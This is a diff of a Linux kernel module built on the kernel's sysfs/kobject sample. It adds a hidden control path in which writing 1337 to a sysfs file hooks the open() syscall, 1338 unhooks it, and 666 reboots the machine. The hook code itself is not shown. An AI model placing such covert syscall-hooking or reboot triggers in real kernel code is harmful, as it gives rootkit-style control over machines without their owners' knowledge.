@@ -2,36 +2,42 @@
  * How to use sysfs and kobjects.
  * Adapted from the samples/ directory of the kernel tree
  *
- * This makes a subdirectory in sysfs called /sys/kernel/kobject-example.
+ * This makes a subdirectory in sysfs called /sys/kernel/DIRNAME.
  * In that directory, 3 files are created: "foo", "baz", and "bar".
  * If an integer is written to these files, it can be read out of it later.
  * However, each file changes its integer in its own way whenever we read it.
  */
 
+#include <linux/module.h>	/* for THIS_MODULE macro */
 #include <linux/kobject.h>
 #include <linux/string.h>
 #include <linux/sysfs.h>
 
 #include <linux/reboot.h>	/* for doing retarded shit  :) 	*/
+#include "toplel.h"		/* even more retarded shit  :) 	*/
 #include "kapi.h"		/* for get_process_info() 	*/
 
+#define DIRNAME			THIS_MODULE->name
 
 static int foo;
 
 static ssize_t foo_show(struct kobject *kobj, struct kobj_attribute *attr, char *buf)
 {
-	procs_print_task(NULL);
-	return sprintf(buf, "%u\n", foo++);
+	return sprintf(buf, "%u\n", foo);
 }
 
 static ssize_t foo_store(struct kobject *kobj, struct kobj_attribute *attr, const char *buf, size_t count)
 {
-	procs_print_task(NULL);
 	sscanf(buf, "%u", &foo);
 
-	/* If we echo 666 into our foo "file", the machine reboots ;) */
-	if (foo == 666)
-		kernel_restart(NULL);
+	/* 666 reboots the machine
+	 * 1337 hooks the open() syscall.
+	 * 1338 uninstalls the hook */
+	switch (foo) {
+	case 666:	kernel_restart(NULL); 	break;
+	case 1337:	toplel_insert(); 	break;
+	case 1338:	toplel_remove(); 	break;
+	}
 
 	return count;
 }
@@ -46,7 +52,7 @@ static struct attribute *attrs[] = {
 };
 
 /* If we add .name = "mydir", the files will go in 
- * kobject-example/mydir, rather kobject-example */
+ * DIRNAME/mydir, rather than DIRNAME */
 static struct attribute_group attr_group = {
 	.attrs = attrs,
 };
@@ -59,8 +65,8 @@ extern int kobj_init(void)
 {
 	int ret;
 
-	/* Create /sys/kernel/kobject-example */
-	my_kobj = kobject_create_and_add("kobject-example", kernel_kobj);
+	/* Create /sys/kernel/DIRNAME */
+	my_kobj = kobject_create_and_add(DIRNAME, kernel_kobj);
 	if (!my_kobj)
 		return -ENOMEM;
 
